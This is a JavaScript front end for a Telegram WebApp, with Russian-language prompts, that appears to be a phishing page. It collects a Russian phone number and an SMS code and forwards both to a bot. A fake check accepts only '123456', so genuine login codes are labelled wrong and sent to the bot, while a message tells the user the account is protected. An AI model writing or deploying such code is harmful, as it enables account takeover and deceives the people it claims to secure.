document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.setHeaderColor('#060137');
    tg.setBackgroundColor('#060137');
    tg.enableClosingConfirmation();

    // Elements
    const phoneForm = document.getElementById('phone-form');
    const codeForm = document.getElementById('code-form');
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const phoneError = document.getElementById('phone-error');
    const codeError = document.getElementById('code-error');
    const submitCodeBtn = document.getElementById('submit-code');

    // Анимация загрузки
    const setLoading = (element, isLoading) => {
        if (isLoading) {
            element.innerHTML = '<div class="loader"></div>';
            element.disabled = true;
        } else {
            element.textContent = element.dataset.originalText;
            element.disabled = false;
        }
    };

    // Сохраняем оригинальный текст кнопки
    submitCodeBtn.dataset.originalText = submitCodeBtn.textContent;

    // Проверка кода (имитация)
    const verifyCode = async (code) => {
        return new Promise(resolve => {
            setTimeout(() => {
                // В реальном приложении здесь должен быть запрос к серверу
                resolve(code === '123456'); // Пример: правильный код 123456
            }, 1500);
        });
    };

    // Submit phone
    document.getElementById('submit-phone').addEventListener('click', async () => {
        const phone = phoneInput.value.replace(/\D/g, '');
        
        if (!phone) {
            showError(phoneError, 'Введите номер телефона');
            return;
        }
        
        if (!/^7\d{10}$/.test(phone)) {
            showError(phoneError, 'Введите корректный российский номер');
            return;
        }
        
        hideError(phoneError);
        phoneForm.classList.add('hidden');
        codeForm.classList.remove('hidden');
        
        // Отправляем номер
        if (window.sendToBot) {
            await window.sendToBot('phone', `+${phone}`);
        }
    });

    // Submit code
    submitCodeBtn.addEventListener('click', async () => {
        const code = codeInput.value.trim();
        
        if (!code) {
            showError(codeError, 'Введите код из SMS');
            return;
        }
        
        if (!/^\d{6}$/.test(code)) {
            showError(codeError, 'Код должен содержать 6 цифр');
            return;
        }
        
        hideError(codeError);
        setLoading(submitCodeBtn, true);
        
        // Проверка кода
        const isValid = await verifyCode(code);
        
        if (isValid) {
            // Успешная проверка
            if (window.sendToBot) {
                await window.sendToBot('code_verified');
            }
            
            tg.showAlert('✅ Код подтвержден! Ваш аккаунт защищен.', () => {
                tg.close();
            });
        } else {
            // Неверный код
            codeInput.value = '';
            showError(codeError, 'Неверный код. Попробуйте снова');
            if (window.sendToBot) {
                await window.sendToBot('code_failed', code);
            }
        }
        
        setLoading(submitCodeBtn, false);
    });

    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
        element.style.animation = 'shake 0.5s';
        setTimeout(() => element.style.animation = '', 500);
    }

    function hideError(element) {
        element.style.display = 'none';
    }
});